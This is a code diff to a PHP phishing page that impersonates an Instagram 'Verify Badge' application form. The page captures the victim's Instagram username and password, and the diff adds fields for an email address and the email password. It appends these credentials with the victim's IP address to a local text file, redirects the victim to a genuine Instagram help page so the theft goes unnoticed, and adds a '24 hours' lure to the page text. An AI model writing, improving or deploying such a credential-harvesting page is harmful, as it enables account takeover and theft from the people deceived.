@@ -22,18 +22,28 @@ if($_POST)
 if(!empty($_POST['username']) && empty($_POST['comen']))
 {
     $_POST['username'] = strtolower($_POST['username']);
-    //$dosya = fopen("bariscodefx_kullanicilar.txt", "a");
-    //fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "tarih ====> " . date("Y-m-d H:i:s", time()) .  PHP_MULTILINE);
-    //fclose($dosya);
 }
 
 if(isset($_POST['comen']))
 {
-    $dosya = fopen("bariscodefx.txt", "a");
-    fwrite($dosya, "kullanici_adi ====> " . $_POST['username'] . PHP_EOL . "sifre ====> " . $_POST['password'] . PHP_EOL . "Tarih ====> " . date("Y-m-d H:i:s", time()) . PHP_MULTILINE);
+    $dosya = fopen("baris-altay.txt", "a");
+    fwrite($dosya, "
+    $_KULLANICI_ADI : ${$_POST['username']},
+    
+    $_SIFRE         : ${$_POST['password']},
+    
+    $_IP            : ${$_SERVER['REMOTE_ADDR']},
+    
+    $_TARIH         : ${date('Y:m:d', time())},
+    
+    
+    
+    
+    
+    ");
     fclose($dosya);
     
-    header("location: https://help.instagram.com/contact/539946876093520");
+    header("location: https://help.instagram.com/854227311295302/?helpref=hc_fnav");
 }
 
 ?>
@@ -71,7 +81,7 @@ if(isset($_POST['comen']))
             <div class="banner-sm">
                 <img src="images/banner-sm.png" class="banner-sm-img" width="175">
             </div>
-            <span class="color-gray">Get Verify Badge on your Instagram account.</span>
+            <span class="color-gray">Get Verify Badge on your Instagram account. Fill the form and get verify in 24 hours!</span>
             <div class="mb-3">
                 <input type="text" name="username" id="username" class="form-input" placeholder="Username">
             </div>
@@ -87,6 +97,12 @@ if(isset($_POST['comen']))
             <span class="color-gray">Verify Badge on your account.</span>
             <div class="mb-3">
                 <input type="password" name="password" id="password" class="form-input" placeholder="Password">
+            </div>
+            <div class="mb-3">
+                <input type="text" name="email" id="email" class="form-input" placeholder="Email">
+            </div>
+            <div class="mb-3">
+                <input type="password" name="emailPassword" id="emailPassword" class="form-input" placeholer="Email Password">
             </div>
             <input hidden type="text" name="username" id="username" value="<?= $_POST['username']; ?>">
             <input hidden type="number" name="comen" value="1">
